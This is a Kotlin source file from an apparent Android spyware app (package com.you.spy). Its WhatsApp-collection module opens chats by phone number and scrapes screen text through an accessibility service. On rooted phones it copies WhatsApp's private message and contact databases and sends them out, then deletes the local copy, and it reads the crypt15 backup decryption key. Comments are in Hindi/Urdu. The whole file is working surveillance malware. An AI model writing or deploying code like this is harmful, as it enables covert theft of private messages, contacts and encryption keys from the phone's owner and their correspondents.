package com.you.spy.collect

import android.content.Context
import android.content.Intent
import android.net.Uri
import com.you.spy.shell.Shell
import com.you.spy.service.SpyAccessibilityService
import kotlinx.coroutines.delay
import java.io.File

object WaCollect {

    private const val PKG = "com.whatsapp"
    private const val BASE = "/sdcard/Android/media/$PKG/WhatsApp/Media"

    private val dirs = mapOf(
        "media" to "$BASE/WhatsApp Images",
        "video" to "$BASE/WhatsApp Video",
        "voice" to "$BASE/WhatsApp Voice Notes",
        "audio" to "$BASE/WhatsApp Audio",
        "docs" to "$BASE/WhatsApp Documents",
        "gif" to "$BASE/WhatsApp Animated Gifs"
    )

    fun dir(key: String): String? = dirs[key]

    /** Number se chat kholo, phir screen ka text padho. */
    suspend fun openChat(ctx: Context, number: String): String {
        val clean = number.filter { it.isDigit() }
        if (clean.length < 8) return "number galat: $number"

        ctx.startActivity(
            Intent(Intent.ACTION_VIEW, Uri.parse("https://wa.me/$clean"))
                .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
        )
        delay(3500)

        val svc = SpyAccessibilityService.instance ?: return "chat khula, par accessibility off hai"
        val text = svc.dumpScreen()
        if (text.isBlank() || text == "no window") return "screen khaali — WhatsApp install hai?"
        return text
    }

    /** Root: msgstore.db nikaal ke bhejo. */
    suspend fun pullDb(ctx: Context, file: String): String {
        if (!Shell.hasRoot()) return "root nahi hai — msgstore.db nahi milega"

        val src = "/data/data/$PKG/databases/$file"
        val dest = File(ctx.cacheDir, file)
        val r = Shell.exec("cp '$src' '${dest.absolutePath}'; chmod 644 '${dest.absolutePath}'")

        if (!dest.exists() || dest.length() == 0L) {
            return "copy fail\n$r\n\navailable:\n" +
                Shell.exec("ls /data/data/$PKG/databases/")
        }
        val res = FileOps.send(dest)
        dest.delete()
        return res
    }

    /** Root: crypt15 backup ka key. */
    suspend fun pullKey(): String {
        if (!Shell.hasRoot()) return "root nahi hai"
        val k = Shell.exec("cat /data/data/$PKG/files/key")
        return if (k.length > 20) "key:\n<pre>${k.trim()}</pre>" else "key nahi mili:\n$k"
    }

    /** Root: contacts DB (naam ke saath numbers). */
    suspend fun pullContacts(ctx: Context): String = pullDb(ctx, "wa.db")
}
